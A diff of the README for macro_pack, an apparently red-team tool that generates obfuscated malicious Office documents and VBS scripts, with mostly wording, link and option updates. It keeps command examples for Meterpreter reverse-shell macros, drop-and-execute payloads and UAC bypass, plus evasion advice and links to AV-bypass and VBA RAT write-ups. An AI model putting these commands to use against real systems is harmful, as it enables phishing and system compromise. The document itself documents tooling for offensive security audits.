@@ -39,7 +39,7 @@ Note that the main goal of macro\_pack obfuscation is not to prevent reverse eng
 
 ### Generation
 
-Macro Pack can generate several kind of MS office documents and scripts formats.
+Macro Pack can generate several kinds of MS office documents and scripts formats.
 The format will be automatically guessed depending on the given file extension.
 File generation is done using the option --generate or -G.  
 Macro Pack pro version also allow to trojan existing Office files with option --trojan or -T
@@ -87,10 +87,10 @@ I know this will not prevent usage by malicious people and that is why all featu
 
 ### About pro mode...
 You may notice that not all part of macro\_pack is available. Only the community version is available online.
-Features in the pro version are really "weaponizing" the process and I do not want them available to all script kiddies out there.
+Features in the pro version are really "weaponizing" the process, and I do not want them available to all script kiddies out there.
 The pro mode includes features such as:
 * Advance antimalware bypass
-* Shellcode injection
+* Advanced Shellcode injection methods
 * Command line obfuscation (Dosfuscation)
 * ASR and AMSI bypass
 * Self unpacking VBA/VBS payloads
@@ -110,6 +110,7 @@ Some short demo videos are available on the [sevagas youtube channel](https://ww
 Note that MP pro is only available as a commercial offer for professionals.
 If you are in an offensive security audit team and would like more information on how to get "pro" version you can contact me at emeric.nasi[ at ]sevagas.com using your professional email address.
 
+**Important:** If you wish to contact me about MacroPack pro, use my emeric.nasi [at] sevagas.com email address. Also please note that I will not answer to anonymous inquiries for the Pro version. Only to professional emails.
 
 
 ## Run/Install
@@ -308,6 +309,10 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
 
  Security bypass options:
     -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name)
+    --obfuscate-names-charset=<CHARSET> Set a charset for obfuscated variables and functions
+        Choose between: alpha, alphanum, complete or provide the list of char you want
+    --obfuscate-names-minlen=<len> Set min length of obfuscated variables and functions (default 8)
+    --obfuscate-names-maxlen=<len> Set max length of obfuscated variables and functions (default 20)
     --uac-bypass Execute payload with high privileges if user is admin. Compatible with most MacroPack templates
 
 
@@ -401,9 +406,8 @@ This template also generates a  meterpreter.rc file to create the Metasploit han
   -> Example: ```msfconsole -r meterpreter.rc``` 
 
 
-### EMBED_EXE    
-        
-Drop and execute embedded file.
+### EMBED_EXE          
+Drop and execute an embedded file.
 Combine with --embed option, it will drop and execute the embedded file with random name under TEMP folder.
  -> Example: ```macro_pack.exe  -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs```  
  
@@ -422,31 +426,31 @@ The various features were tested against locally installed Antimalware solutions
 A majority of antivirus static will be evaded by the simple "obfuscate" option. However, as most free tools payloads are generally caught by behavioural anaysis such as AMSI.
 Features available in MacroPack pro mode generally permit full AV bypass including AMSI.
 
-**Warning:** Do not submit your samples to online scanner (ex VirusTotal), Its the best way to break your stealth macro.
+**Warning:** Do not submit your samples to online scanner (ex VirusTotal), It's the best way to break your stealth macro.
 I also suggest you do not submit to non reporting site such as NoDistribute. You cannot be sure what these sites will do with the data you submit. 
 If you have an issue with macro\_pack AV detection you can write to us for advice or submit an issue or pull request.
 
 
 ## Relevant resources
 
-Blog posts about hacking with MS Office, VBS, and other retro stuff security:
+Blog posts about MacroPack Pro:
+ - https://blog.sevagas.com/?Launch-shellcodes-and-bypass-Antivirus-using-MacroPack-Pro-VBA-payloads
  - https://blog.sevagas.com/?EXCEL-4-0-XLM-macro-in-MacroPack-Pro (Excel 4.0 payloads in MacroPack Pro)
  - https://blog.sevagas.com/?Advanced-MacroPack-payloads-XLM-Injection (XLM injection in MacroPack Pro)
+
+Blog posts about hacking with MS Office, VBS, and other retro stuff security:
+ - https://blog.sevagas.com/?Bypass-Windows-Defender-Attack-Surface-Reduction
  - https://subt0x11.blogspot.fr/2018/04/wmicexe-whitelisting-bypass-hacking.html
  - http://blog.sevagas.com/?My-VBA-Bot (write a full VBA RAT, includes how to bypass VBOM protection)
  - http://blog.sevagas.com/?Hacking-around-HTA-files  (run hta code in non-hta files and hta polyglots)
- - http://pwndizzle.blogspot.fr/2017/03/office-document-macros-ole-actions-dde.html
  - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ (About Dynamic Data Exchange attacks)
  - https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
- - https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/
  
  Other useful links:
  - https://github.com/p3nt4/PowerShdll (Run PowerShell with dlls only)
  - https://gist.github.com/vivami/03780dd512fec22f3a2bae49f9023384 (Run powershell script with PowerShdll VBA implementation)
- - https://enigma0x3.net/2016/03/15/phishing-with-empire/ (Generate Empire VBA payload)
  - https://github.com/EmpireProject/Empire
  - https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
- - https://www.metasploit.com/
  - https://github.com/Cn33liz/MacroMeter
  - https://github.com/khr0x40sh/MacroShop
  - https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script
@@ -467,6 +471,6 @@ Emails:
 
 [The Apache License 2.0](https://www.apache.org/licenses/LICENSE-2.0.html)
 
-Copyright 2017,2018,2019,2020 Emeric “Sio” Nasi ([blog.sevagas.com](https://blog.sevagas.com))
+Copyright 2017,2018,2019,2020,2021 Emeric “Sio” Nasi ([blog.sevagas.com](https://blog.sevagas.com))
 
 
